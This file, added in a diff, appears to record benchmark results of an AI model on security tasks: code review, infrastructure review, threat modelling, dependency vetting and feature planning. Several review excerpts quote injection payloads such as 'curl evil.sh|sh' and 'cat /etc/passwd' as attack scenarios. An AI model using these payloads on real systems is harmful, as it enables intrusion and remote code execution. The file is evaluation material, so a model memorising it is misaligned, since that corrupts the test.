@@ -1,0 +1,359 @@
+{
+  "model": "sonnet",
+  "results": [
+    {
+      "id": "review-finds-planted-vulns",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 19.7,
+      "turns": 5,
+      "cost_usd": 0.0649,
+      "answer_excerpt": "### Verdict: **BLOCK**\n\nThe change adds three endpoints. Each has a Critical or High flaw, and none has authentication or tests.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`** \u2014 `app.py:22-23`\n- Standard: \u00a711 Injection\n- Scenario: `POST host=1.1.1.1; curl evil.sh|sh` runs through `shell=True` and executes arbitrary commands as the app user. The caller needs no login.\n- Fix: Drop the shell and pass an argument list: `subprocess.check_output([\"ping\",\"-c\",\"1\",\"--\",host], timeout=5)`. Validate `host` with `ipaddress` or a strict hostname regex first. A value starting with `-` must a"
+    },
+    {
+      "id": "review-finds-planted-vulns",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 22.5,
+      "turns": 5,
+      "cost_usd": 0.065,
+      "answer_excerpt": "### Verdict\n**BLOCK**: the diff adds three Critical vulnerabilities, each reachable by an unauthenticated user. I reviewed all of `app.py`, the only changed file. `.claude/` is untracked and I didn't review it. There is no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md`.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`**: `app.py:~22`\n- Standard: \u00a711 Injection\n- Scenario: `POST /ping` with `host=8.8.8.8; cat /etc/passwd` or `$(curl evil|sh)`. The f-string goes into `shell=True`, so the attacker gets remote code execution as the app user.\n- Fix: Drop the shell and pass an argument l"
+    },
+    {
+      "id": "review-finds-planted-vulns",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 27.3,
+      "turns": 7,
+      "cost_usd": 0.0743,
+      "answer_excerpt": "### Verdict\n**BLOCK**: the diff adds three Critical vulnerabilities and has no authentication or tests. The change is `app.py` only. There are no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md` files. I did not read the skill's reference files (\u00a711, \u00a712, \u00a715), so the ratings below are my own judgment against the severity scale in the skill, not checked against them.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`**: `app.py:22-23`\n- Standard: \u00a711 Injection\n- Scenario: `POST /ping` with `host=8.8.8.8; cat /etc/passwd` or `host=$(curl evil|sh)` runs arbitrary commands as the app use"
+    },
+    {
+      "id": "review-no-false-positive",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 26.8,
+      "turns": 6,
+      "cost_usd": 0.0672,
+      "answer_excerpt": "### Verdict\n**APPROVE**\n\nI reviewed `textutil.py` (adds `slugify`) and `test_textutil.py` (new). I couldn't run pytest because the command needed approval that wasn't granted. I traced the six tests by hand instead, and each one passes.\n\n### Findings\nNone.\n\n### Checked and clean\n- **Input validation:** a non-`str` input raises `TypeError`. `max_len < 1` raises `ValueError`. A non-numeric `max_len` fails on the comparison with a `TypeError`.\n- **Injection and path safety:** the output is limited to `[a-z0-9-]`. After NFKD normalization and an ASCII-only encode, there are no path separators, dot"
+    },
+    {
+      "id": "review-no-false-positive",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 28.8,
+      "turns": 7,
+      "cost_usd": 0.0745,
+      "answer_excerpt": "I couldn't run the tests because the sandbox blocked pytest, so this review comes from reading the code.\n\n### Verdict\n**APPROVE**\n\n### Findings\nNone. I found nothing Medium or higher, and nothing Low that's worth raising.\n\n### Checked and clean\n- **Input validation:** `slugify` raises `TypeError` for non-str input. It raises `ValueError` for `max_len < 1`. A non-int `max_len` such as a str would raise `TypeError` from the comparison, which is acceptable.\n- **Injection and traversal:** the output is limited to `[a-z0-9-]`. Separators, dots, quotes, and null bytes can't get through, so the slug "
+    },
+    {
+      "id": "review-no-false-positive",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 48.2,
+      "turns": 12,
+      "cost_usd": 0.0978,
+      "answer_excerpt": "### Verdict\n**APPROVE**\n\nI reviewed the change by reading it. I couldn't run the tests or the function, because the sandbox refused to run `pytest` or Python without approval. Please run `pytest` yourself before merging.\n\nThe change is the new `slugify()` in `textutil.py` (+15 lines) and `test_textutil.py` (+28 lines). There is no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md` in the repo.\n\n### Findings\n- **[Low] Non-ASCII-only input gives an empty slug** \u2014 `textutil.py:14-16`\n  - Standard: \u00a711 validation, correctness\n  - Scenario: `slugify(\"\u65e5\u672c\u8a9e\")` or `slugify(\"!!!\")` returns `\"\"`. If a call"
+    },
+    {
+      "id": "review-sarif-output",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 44.8,
+      "turns": 8,
+      "cost_usd": 0.0858,
+      "answer_excerpt": "### Verdict\n**BLOCK**: three Critical findings, all in `app.py`.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`**: `app.py:23`\n- Standard: \u00a711 Injection\n- Scenario: `POST /ping` with `host=8.8.8.8; cat /etc/passwd` or `$(curl evil|sh)`. The value goes into a `shell=True` string, so an unauthenticated caller gets remote code execution.\n- Fix: Use `subprocess.run([\"ping\",\"-c\",\"1\",host], shell=False, timeout=5)`. Validate `host` with `ipaddress` or a hostname regex, and reject values starting with `-`. Add authentication.\n\n**[Critical] SQL injection in `/user`**: `app.py:13`\n- Standa"
+    },
+    {
+      "id": "review-sarif-output",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 33.5,
+      "turns": 7,
+      "cost_usd": 0.0922,
+      "answer_excerpt": "### Verdict\n**BLOCK**. The change adds three Critical vulnerabilities (SQL injection, path traversal, command injection) and several Medium gaps.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`** \u2014 `app.py:23`\n- Standard: \u00a711 Injection\n- Scenario: `POST /ping` with `host=8.8.8.8; cat /etc/passwd` runs through `shell=True`. The caller gets arbitrary command execution as the app user, and the output is returned in the response.\n- Fix: Drop the shell. Validate `host` with `ipaddress.ip_address` or a strict hostname regex, then call `subprocess.run([\"ping\",\"-c\",\"1\",\"--\",host], capture_"
+    },
+    {
+      "id": "review-sarif-output",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 30.8,
+      "turns": 7,
+      "cost_usd": 0.0856,
+      "answer_excerpt": "### Verdict\n**BLOCK**. The change adds three Critical vulnerabilities and several lower-severity gaps. No `.security/rules.md`, `AGENTS.md` or `CLAUDE.md` exists, so only the base standard applied.\n\n### Findings\n\n**[Critical] OS command injection in `/ping`** \u2014 `app.py:23`\n- Standard: \u00a711 Injection\n- Scenario: `host=8.8.8.8; cat /etc/passwd` or `$(curl evil|sh)` runs arbitrary commands as the app user, because the form value is interpolated into a `shell=True` command. There is also no auth, so anyone can call it.\n- Fix: Drop the shell and pass an argument list: `subprocess.check_output([\"ping"
+    },
+    {
+      "id": "review-enforces-org-rules",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 31.6,
+      "turns": 6,
+      "cost_usd": 0.0726,
+      "answer_excerpt": "### Verdict\n**BLOCK**: one High finding (ORG-1 is rated Medium in `.security/rules.md`; the rest are Medium or Low).\n\nCorrection: ORG-1 is rated **Medium** in the rules file, so by severity alone this change is **REQUEST CHANGES**. I'm keeping BLOCK off the table. The corrected verdict is **REQUEST CHANGES**.\n\nI reviewed `rates.py` (the only changed file) and `.security/rules.md`. I did not read the skill's reference files in full.\n\n### Findings\n\n**[Medium] ORG-1: outbound HTTP call has no timeout**: `rates.py:10`\n- Standard: ORG-1, \u00a711 (error handling), LLM10 (unbounded cost)\n- Scenario: `req"
+    },
+    {
+      "id": "review-enforces-org-rules",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 14.7,
+      "turns": 5,
+      "cost_usd": 0.0646,
+      "answer_excerpt": "### Verdict\n**REQUEST CHANGES** (Medium findings only). The change is `rates.py`, with `latest_rate()` added. `.security/rules.md` was read first.\n\n### Findings\n\n**[Medium] No timeout on the outbound HTTP call (ORG-1)** \u2014 `rates.py:10`\n- Standard: ORG-1; LLM10 / \u00a711 on unbounded resource use.\n- Scenario: `requests.get` has no `timeout`, so it can wait forever. If the rates host stalls or tarpits the connection, every caller of `latest_rate` hangs. Under concurrent load, that exhausts the worker pool.\n- Fix: `requests.get(..., timeout=(3.05, 10))`. Catch `requests.RequestException` and re-raise"
+    },
+    {
+      "id": "review-enforces-org-rules",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-code-review"
+      ],
+      "seconds": 20.8,
+      "turns": 6,
+      "cost_usd": 0.0726,
+      "answer_excerpt": "### Verdict\n**REQUEST CHANGES**. There are no Critical or High findings. There are two Medium findings. `rates.py` is the only changed file.\n\n### Findings\n\n**[Medium] ORG-1: outbound HTTP call has no timeout** \u2014 `rates.py:11`\n- Standard: ORG-1 (the org file sets this to Medium), \u00a711, LLM10\n- Scenario: `requests.get` has no `timeout`, so it can wait forever. If `api.exchangerate.host` accepts the connection and then stalls, the calling thread or worker hangs. Enough such calls would exhaust the worker pool.\n- Fix: `requests.get(..., timeout=(3.05, 10))`. Catch `requests.Timeout` and `requests.R"
+    },
+    {
+      "id": "iac-review-finds-misconfigs",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "iac-security-review"
+      ],
+      "seconds": 33.6,
+      "turns": 11,
+      "cost_usd": 0.0918,
+      "answer_excerpt": "### Verdict\n**BLOCK**: there are Critical and High findings in all four files. I didn't run any commands against infrastructure. The repo has no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md`.\n\n### Findings\n\n**[Critical] `pull_request_target` runs untrusted PR code with secrets**\n`.github/workflows/pr.yml:2,9,12-14`. The workflow checks out the PR head SHA and runs `npm ci && npm test` with `NPM_TOKEN` in the environment. `pull_request_target` runs with base-repo secrets and a write-capable token. A fork PR can change `package.json` scripts or the tests and steal `NPM_TOKEN`.\nFix: use the `p"
+    },
+    {
+      "id": "iac-review-finds-misconfigs",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "iac-security-review"
+      ],
+      "seconds": 42.1,
+      "turns": 10,
+      "cost_usd": 0.0949,
+      "answer_excerpt": "### Verdict\n**BLOCK**: there are 10 Critical/High findings across all four areas. I read the four changed files (`main.tf`, `Dockerfile`, `k8s/deployment.yaml`, `.github/workflows/pr.yml`). The repo has no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md`. I changed nothing and ran no infrastructure commands.\n\n### Findings\n\n**[Critical] `pull_request_target` runs untrusted PR code with secrets**\n- Location: `.github/workflows/pr.yml:2,9,12-14`\n- Standard section: \u00a711 (appsec: secrets, injection).\n- Scenario: the workflow checks out the PR head SHA and runs `npm ci && npm test` with `NPM_TOKEN` "
+    },
+    {
+      "id": "iac-review-finds-misconfigs",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "iac-security-review"
+      ],
+      "seconds": 24.3,
+      "turns": 11,
+      "cost_usd": 0.0942,
+      "answer_excerpt": "### Verdict\n**BLOCK**. There are several Critical and High findings. I read all four changed files (`main.tf`, `k8s/deployment.yaml`, `Dockerfile`, `.github/workflows/pr.yml`). I found no `.security/rules.md`, `AGENTS.md` or `CLAUDE.md`.\n\n### Findings\n\n**[Critical] `pull_request_target` runs untrusted PR code with secrets**\n`.github/workflows/pr.yml:2,7-14` (CI/CD supply chain)\n- The workflow checks out the PR head SHA and runs `npm ci && npm test` with `NPM_TOKEN` set. Anyone who opens a PR can edit `package.json` scripts or the tests and steal the token. They also get a write-scoped `GITHUB_"
+    },
+    {
+      "id": "threat-model-rag-design",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "threat-model"
+      ],
+      "seconds": 51.2,
+      "turns": 17,
+      "cost_usd": 0.1216,
+      "answer_excerpt": "I've read the design and the relevant standard sections. Next I'm writing the threat model.\n\n# Threat model: Support assistant (`design.md`)\n\n### 1. Scope\n**In scope:** the chat widget, SSO, retrieval, PDF upload and ingestion, the LLM call, the two tools (`lookup_order`, `issue_refund`), prompt/response logging, and the public endpoint. **Out of scope:** the model provider's internals and the order and billing systems, except for how we call them. **Stack:** design-only. There is no code or manifest in the repo and no `.security/rules.md`. The stack is a web widget, a shared vector index, an "
+    },
+    {
+      "id": "threat-model-rag-design",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "threat-model"
+      ],
+      "seconds": 42.6,
+      "turns": 9,
+      "cost_usd": 0.0931,
+      "answer_excerpt": "### 1. Scope\nThis models `design.md`, a B2B multi-tenant support chatbot. It covers SSO sign-in, the chat widget, RAG over a shared vector index, PDF upload and ingestion, the LLM with the tools `lookup_order` and `issue_refund`, warehouse logging, and the public endpoint. Out of scope: the SSO provider internals and the order/payments backend, apart from the authorization they must enforce. The stack is undetected because the repo has only the design doc. There is no `.security/rules.md`.\n\n### 2. Assets\n- Tenant isolation: each tenant's tickets and documents.\n- Money: refunds.\n- Customer PII "
+    },
+    {
+      "id": "threat-model-rag-design",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "threat-model"
+      ],
+      "seconds": 33.6,
+      "turns": 11,
+      "cost_usd": 0.0947,
+      "answer_excerpt": "### 1. Scope\nThis models the support assistant in `design.md`. It covers the chat widget, SSO, embedding and retrieval, PDF upload and ingestion, LLM calls, the two tools (`lookup_order`, `issue_refund`), and the logging to the warehouse. The LLM provider's internals and the SSO IdP are out of scope. The design doesn't name a stack, so no manifests were checked. There is no `.security/rules.md`.\n\n### 2. Assets\n- Tenant isolation: each customer's tickets, contracts and invoices.\n- Money: refunds are executed immediately.\n- Order data: from `lookup_order`.\n- PII and financial data in prompts, re"
+    },
+    {
+      "id": "dependency-vetting-known-cve",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "dependency-vetting"
+      ],
+      "seconds": 21.6,
+      "turns": 6,
+      "cost_usd": 0.0806,
+      "answer_excerpt": "### Verdict\n**REJECT keeping 4.17.15.** Upgrade it. Treat 4.17.21 as the minimum. I found reports of newer fixes in 4.18.x, but I haven't confirmed them against the primary advisories.\n\n### Evidence\n- **CVE-2020-8203** (prototype pollution via `_.zipObjectDeep`) affects lodash up to 4.17.15. The recommended fix is 4.17.19 or later, though some sources say the fix landed in 4.17.20 ([Debian tracker](https://security-tracker.debian.org/tracker/CVE-2020-8203), [FOSSA](https://observer.fossa.com/package/lodash)).\n- **CVE-2021-23337** (command injection via `_.template`) affects versions before 4.1"
+    },
+    {
+      "id": "dependency-vetting-known-cve",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "dependency-vetting"
+      ],
+      "seconds": 43.8,
+      "turns": 11,
+      "cost_usd": 0.118,
+      "answer_excerpt": "### Verdict\n**REJECT keeping 4.17.15. Upgrade to lodash 4.18.1 or later.** Even 4.17.21 is no longer the end of the road.\n\n### Evidence\n- **CVE-2020-8203** is prototype pollution via `_.zipObjectDeep`, with a CVSS score of 7.4. It affects 4.17.15 and is fixed in 4.17.19 and later ([Vumetric](https://cyber.vumetric.com/vulns/lodash), [VersionEye](https://www.versioneye.com/NodeJS/lodash/4.17.15)).\n- **CVE-2021-23337** is command injection via `_.template`, with a CVSS score of 7.2. It affects every version before 4.17.21 ([Debian tracker](https://security-tracker.debian.org/tracker/CVE-2021-233"
+    },
+    {
+      "id": "dependency-vetting-known-cve",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "dependency-vetting"
+      ],
+      "seconds": 36.0,
+      "turns": 8,
+      "cost_usd": 0.1262,
+      "answer_excerpt": "### Verdict\n**REJECT keeping 4.17.15.** Upgrade it. The pin in `package.json:6` is a version with known CVEs.\n\n### Evidence\n- CVE-2021-23337 is command injection through `_.template`, CVSS 7.2. It affects every version before 4.17.21. [Dependabot PR threads](https://github-redirect.dependabot.com/Nizar-dev-renovate-read-only/Error-noPR/pull/16)\n- CVE-2020-8203 is prototype pollution through `_.zipObjectDeep`, CVSS 7.4, and 4.17.15 is affected. Sources disagree on the fix version (4.17.19 in one report), and 4.17.21 covers it. [Fossa](https://observer.fossa.com/package/lodash)\n- CVE-2020-28500 "
+    },
+    {
+      "id": "feature-build-plans-and-waits",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-feature-build"
+      ],
+      "seconds": 26.6,
+      "turns": 6,
+      "cost_usd": 0.0755,
+      "answer_excerpt": "This is tier L. Password reset is an authentication flow, which is a new trust boundary. I haven't changed any files yet.\n\n**What the app has today:** `app.py` is 6 lines with one `/health` route. It has no users, no password storage, no database, no login, no email sending and no tests. A reset flow needs all of that underneath it, so the plan below covers it too.\n\n## Plan\n\n**Objective:** a user can request a reset by email, receive a single-use expiring link, and set a new password.\n\n**Stack:** Flask, SQLite through the stdlib `sqlite3`, `argon2-cffi` for password hashing, and `pytest`. Emai"
+    },
+    {
+      "id": "feature-build-plans-and-waits",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-feature-build"
+      ],
+      "seconds": 25.5,
+      "turns": 8,
+      "cost_usd": 0.0853,
+      "answer_excerpt": "**Gate 0 \u2014 Tier L.** Password reset is a new auth trust boundary. The repo has none of what it needs: no users, no password storage, no database, no email sender, no login.\n\n`app.py` is 6 lines, a single `/health` route on Flask. Here is the plan. I'm waiting for your approval and haven't written any code.\n\n## Plan\n\n**Objective:** Self-service password reset by emailed one-time link.\n\n**Open questions (they change the design):**\n1. There is no user store or login. Should I add a minimal one, SQLite with argon2 password hashes, `/register` and `/login`? Or is there another app or database I sho"
+    },
+    {
+      "id": "feature-build-plans-and-waits",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "secure-feature-build"
+      ],
+      "seconds": 27.8,
+      "turns": 8,
+      "cost_usd": 0.101,
+      "answer_excerpt": "**Gate 0 \u2014 Tier L.** Password reset is authentication and a new trust boundary. The app is also a bare Flask stub with only `/health`, and has no user store, no email sender, no sessions and no tests, so there's nothing to hook into yet.\n\n## Plan\n\n**Objective:** a password reset flow with two steps: request a reset link, then set a new password using that link.\n\n**Stack and scope:** Flask and SQLite (standard library `sqlite3`). Passwords are hashed with `werkzeug.security` (scrypt), which ships with Flask, so there's no new dependency for hashing. Tests use pytest, which is a dev-only depende"
+    },
+    {
+      "id": "standard-answers-logging-question",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "ai-security-standard"
+      ],
+      "seconds": 11.7,
+      "turns": 7,
+      "cost_usd": 0.0586,
+      "answer_excerpt": "**No. Don't log full prompts and responses in production by default.** The security standard for this project has a MUST rule against it (\u00a72, LLM02): *\"MUST NOT log full prompts, completions, document text, credentials, tokens, or PII. Log IDs, counts, latencies, and hashes.\"* There is no `.security/rules.md` in this repo that changes that.\n\n**Why it's risky**\n- Prompts and responses often contain user PII, pasted documents, secrets and RAG-retrieved content. Logs are usually retained longer, accessed more widely and protected less than the primary data store.\n- Logging them spreads that data "
+    },
+    {
+      "id": "standard-answers-logging-question",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "ai-security-standard"
+      ],
+      "seconds": 11.6,
+      "turns": 7,
+      "cost_usd": 0.058,
+      "answer_excerpt": "**No. Under the security standard this project follows, logging full prompts and completions in production breaks a MUST rule (\u00a72, LLM02).** The rule says not to log full prompts, completions, document text, credentials, tokens, or PII. Log IDs, counts, latencies, and hashes instead.\n\n**Why it matters**\n- Prompts and responses often contain user PII, pasted documents, secrets, and RAG-retrieved content. Your log store then holds all of it, usually with weaker access controls, longer retention, and wider access than the primary datastore.\n- Prompts also carry your system prompt, which you're su"
+    },
+    {
+      "id": "standard-answers-logging-question",
+      "pass": true,
+      "fails": [],
+      "skills": [
+        "ai-security-standard"
+      ],
+      "seconds": 22.1,
+      "turns": 7,
+      "cost_usd": 0.0596,
+      "answer_excerpt": "**No. Under this security standard, logging full prompts and responses in production breaks a MUST rule (\u00a72, LLM02).** It says: \"MUST NOT log full prompts, completions, document text, credentials, tokens, or PII. Log IDs, counts, latencies, and hashes.\" A change that breaks a MUST rule isn't shippable. There's no `.security/rules.md` in this repo, so nothing here relaxes that.\n\n**Why it matters**\n- Prompts and completions carry user input, retrieved documents, and tool output. That often includes PII, secrets, and other tenants' data.\n- Logs usually have broader access, longer retention, and f"
+    },
+    {
+      "id": "no-skill-for-unrelated-task",
+      "pass": true,
+      "fails": [],
+      "skills": [],
+      "seconds": 4.5,
+      "turns": 1,
+      "cost_usd": 0.0302,
+      "answer_excerpt": "Crisp leaves drift down in gold,\nWhispering that summer's story's told."
+    },
+    {
+      "id": "no-skill-for-unrelated-task",
+      "pass": true,
+      "fails": [],
+      "skills": [],
+      "seconds": 5.1,
+      "turns": 1,
+      "cost_usd": 0.0303,
+      "answer_excerpt": "Crimson leaves let go of summer's breath,\nAnd drift like small goodbyes to the earth beneath."
+    },
+    {
+      "id": "no-skill-for-unrelated-task",
+      "pass": true,
+      "fails": [],
+      "skills": [],
+      "seconds": 6.4,
+      "turns": 1,
+      "cost_usd": 0.0303,
+      "answer_excerpt": "Crimson leaves drift down in the amber light,\nWhispering that summer has taken its flight."
+    }
+  ]
+}
